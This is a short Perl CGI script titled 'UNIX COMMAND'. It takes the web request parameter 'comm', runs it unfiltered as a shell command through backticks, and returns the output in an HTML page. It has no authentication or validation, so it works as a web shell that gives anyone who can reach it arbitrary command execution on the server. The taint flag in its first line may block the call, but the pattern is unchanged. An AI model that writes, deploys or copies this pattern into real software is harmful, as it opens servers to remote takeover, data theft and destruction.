#! /usr/bin/perl -wT
use CGI':standard';


print "Content-type:text/html\n\n",
      "<html><head><title>UNIX COMMAND</title></head>",
      "<body><h1>Result</h1><br>";
$command = param('comm');
$command = `$command`;
print "Result :$command";


